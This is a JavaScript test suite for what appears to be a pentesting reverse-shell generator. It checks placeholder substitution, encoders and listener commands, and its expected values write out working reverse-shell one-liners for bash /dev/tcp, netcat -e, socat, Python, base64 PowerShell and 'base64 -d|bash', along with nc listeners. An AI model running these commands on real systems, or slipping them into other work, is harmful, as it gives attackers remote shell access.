// Reverse shell generator: substitution, encoders, and payload integrity. Run: npm test
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { PAYLOADS, LISTENERS, generate, listen, encode, psB64 } from '../assets/tools/lib/revshells.js';

const o = { ip: '10.0.0.5', port: '4444', shell: '/bin/bash' };

test('known one-liners substitute ip/port/shell', () => {
  const by = (id) => PAYLOADS.find((p) => p.id === id);
  assert.equal(generate(by('bash-i'), o, 'none', 'rev'), 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1');
  assert.equal(generate(by('nc-e'), o, 'none', 'rev'), 'nc 10.0.0.5 4444 -e /bin/bash');
  assert.equal(generate(by('socat'), o, 'none', 'rev'), 'socat TCP:10.0.0.5:4444 EXEC:/bin/bash');
  assert.match(generate(by('py-subprocess'), o, 'none', 'rev'), /connect\(\("10\.0\.0\.5",4444\)\)/);
});

test('every payload consumes ip, port and leaves no placeholder', () => {
  for (const p of PAYLOADS) {
    for (const type of ['rev', 'bind']) {
      if (type === 'bind' && !p.bind) continue;
      const out = generate(p, o, 'none', type);
      assert.ok(typeof out === 'string' && out.length, `${p.id}/${type} empty`);
      assert.ok(!/\$\{|undefined/.test(out), `${p.id}/${type} leftover: ${out}`);
      // base64 payloads carry the port inside the blob, checked separately below
      if (type === 'rev' && !p.noEncode) assert.ok(out.includes('4444'), `${p.id} missing port`);
      if (type === 'rev' && !p.noEncode && p.os !== 'win') assert.ok(out.includes('10.0.0.5'), `${p.id} missing ip`);
    }
  }
});

test('powershell base64 decodes to the live host and port', () => {
  const out = generate(PAYLOADS.find((p) => p.id === 'ps-b64'), o, 'none', 'rev');
  const b64 = out.split(' ').pop();
  const txt = Buffer.from(b64, 'base64').toString('utf16le');
  assert.match(txt, /TCPClient\('10\.0\.0\.5',4444\)/);
});

test('encoders', () => {
  assert.equal(encode('a b', 'url', '/bin/sh'), 'a%20b');
  assert.equal(encode('a b', 'durl', '/bin/sh'), 'a%2520b');
  const b = encode('whoami', 'b64', '/bin/bash');
  assert.match(b, /^echo d2hvYW1p\|base64 -d\|bash$/);
  // base64 payloads are flagged noEncode so they are never double-wrapped
  const ps = PAYLOADS.find((p) => p.id === 'ps-b64');
  assert.equal(generate(ps, o, 'b64', 'rev'), generate(ps, o, 'none', 'rev'));
  assert.equal(psB64('AB'), Buffer.from('A\0B\0', 'binary').toString('base64'));
});

test('listeners match the mode', () => {
  const nc = LISTENERS.find((l) => l.id === 'nc');
  assert.equal(listen(nc, o, 'rev'), 'nc -lvnp 4444');
  assert.equal(listen(nc, o, 'bind'), 'nc -v 10.0.0.5 4444');
  assert.equal(listen(LISTENERS.find((l) => l.id === 'msf'), o, 'bind'), null);
});